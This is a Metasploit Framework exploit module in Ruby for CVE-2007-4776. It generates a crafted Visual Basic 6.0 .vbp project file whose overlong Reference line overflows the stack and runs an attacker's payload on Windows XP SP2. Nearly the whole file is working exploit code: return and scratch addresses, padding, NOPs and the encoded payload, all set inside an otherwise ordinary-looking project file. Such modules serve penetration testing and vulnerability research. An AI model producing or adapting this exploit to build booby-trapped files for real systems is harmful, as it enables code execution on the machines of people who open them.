##
# $Id: ms_visual_basic_vbp.rb 10477 2010-09-25 11:59:02Z mc $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Visual Basic VBP Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack oveflow in Microsoft Visual
				Basic 6.0. When a specially crafted vbp file containing a long
				reference line, an attacker may be able to execute arbitrary
				code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'MC' ],
			'Version'        => '$Revision: 10477 $',
			'References'     =>
				[
					[ 'CVE', '2007-4776' ],
					[ 'OSVDB', '36936' ],
					[ 'BID', '25629' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'true',
				},
			'Payload'        =>
				{
					'Space'    => 650,
					'BadChars' => "\x00\x0a\x0d\x20",
					'StackAdjustment' => -3500,
					'DisableNops'   =>  'True',
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP2 English', { 'Ret' => 0x0fabd271, 'Scratch' => 0x7ffddfb4 } ],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Sep 4 2007',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'msf.vbp']),
			], self.class)
	end

	def exploit

		sploit =  rand_text_alpha_upper(496) + [target.ret].pack('V')
		sploit << rand_text_alpha_upper(12) + [target['Scratch']].pack('V')
		sploit << make_nops(24) + payload.encoded

		vbp =  "Type=Exe\r\n"
		vbp << "Form=Form2.frm\r\n"
		vbp << "Reference=*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#..\\..\\..\\..\\WINNT\\System32\\stdole2.tlb#OLE Automation"
		vbp << sploit + "\r\n"
		vbp << "Startup=\"Form2\"\r\n"
		vbp << "Command32=\"\"\r\n"
		vbp << "Name=\"Project2\"\r\n"
		vbp << "HelpContextID=\"0\"\r\n"
		vbp << "CompatibleMode=\"0\"\r\n"
		vbp << "MajorVer=1\r\n"
		vbp << "MinorVer=0\r\n"
		vbp << "RevisionVer=0\r\n"
		vbp << "AutoIncrementVer=0\r\n"
		vbp << "ServerSupportFiles=0\r\n"
		vbp << "VersionCompanyName=\"\"\r\n"
		vbp << "CompilationType=0\r\n"
		vbp << "OptimizationType=0\r\n"
		vbp << "FavorPentiumPro(tm)=0\r\n"
		vbp << "CodeViewDebugInfo=0\r\n"
		vbp << "NoAliasing=0\r\n"
		vbp << "BoundsCheck=0\r\n"
		vbp << "OverflowCheck=0\r\n"
		vbp << "FlPointCheck=0\r\n"
		vbp << "FDIVCheck=0\r\n"
		vbp << "UnroundedFP=0\r\n"
		vbp << "StartMode=0\r\n"
		vbp << "Unattended=0\r\n"
		vbp << "Retained=0\r\n"
		vbp << "ThreadPerObject=0\r\n"
		vbp << "MaxNumberOfThreads=1\r\n"
		vbp << "[MS Transaction Server]\r\n"
		vbp << "AutoRefresh=1\r\n"

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(vbp)

	end

end
